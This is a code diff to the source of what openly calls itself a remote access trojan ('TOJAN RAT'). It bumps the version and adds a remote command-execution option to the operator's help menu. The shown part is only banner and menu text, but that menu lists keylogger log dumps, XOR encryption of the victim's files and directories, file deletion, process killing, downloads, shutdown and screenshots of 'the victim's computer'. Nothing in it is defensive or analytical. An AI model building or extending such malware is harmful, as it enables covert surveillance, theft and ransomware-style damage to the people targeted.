@@ -14,7 +14,7 @@ void PrintGreeting() {
 	SetConsoleTextAttribute(hConsole, 13);
 	std::cout << "TOJAN RAT ";
 	SetConsoleTextAttribute(hConsole, 7);
-	std::cout << "0.0.1 ";
+	std::cout << "0.0.2 ";
 	SetConsoleTextAttribute(hConsole, 13);
 	std::cout << "by HUGOW04              \n";
 	SetConsoleTextAttribute(hConsole, 10);		
@@ -42,19 +42,20 @@ void HelpMenu() {
 		<< "|1 | [help]         - print help menu                  |\n"
 		<< "|2 | [close]        - close connection                 |\n"
 		<< "|3 | [pwd]          - path                             |\n"
-		<< "|4 | [ls]           - list files and dirs              |\n"
-		<< "|5 | [rm]           - delete file                      |\n"
-		<< "|6 | [rmdir]        - delete directory                 |\n"
-		<< "|7 | [info]         - information (os, cpu, gpu, etc)  |\n"
-		<< "|8 | [ps]           - process info                     |\n"
-		<< "|9 | [kill]         - kill process                     |\n"
-		<< "|10| [keydump]      - dump logs of keylogger           |\n"
-		<< "|11| [cryptfile]    - encrypt file      with using XOR |\n"
-		<< "|12| [cryptdir]     - encrypt directory with using XOR |\n"
-		<< "|13| [download]     - download file                    |\n"
-		<< "|14| [shutdown]     - shuting down                     |\n"
-		<< "|15| [error]        - print error (english only)       |\n"
-		<< "|16| [screencap]    - screenshot the victim's computer |\n"
+		<< "|4 | [cmd]          - cmd                              |\n"
+		<< "|5 | [ls]           - list files and dirs              |\n"
+		<< "|6 | [rm]           - delete file                      |\n"
+		<< "|7 | [rmdir]        - delete directory                 |\n"
+		<< "|8 | [info]         - information (os, cpu, gpu, etc)  |\n"
+		<< "|9 | [ps]           - process info                     |\n"
+		<< "|10| [kill]         - kill process                     |\n"
+		<< "|11| [keydump]      - dump logs of keylogger           |\n"
+		<< "|12| [cryptfile]    - encrypt file      with using XOR |\n"
+		<< "|13| [cryptdir]     - encrypt directory with using XOR |\n"
+		<< "|14| [download]     - download file                    |\n"
+		<< "|15| [shutdown]     - shuting down                     |\n"
+		<< "|16| [error]        - print error (english only)       |\n"
+		<< "|17| [screencap]    - screenshot the victim's computer |\n"
 		<< "--------------------------------------------------------\n" << std::endl;
 }
 
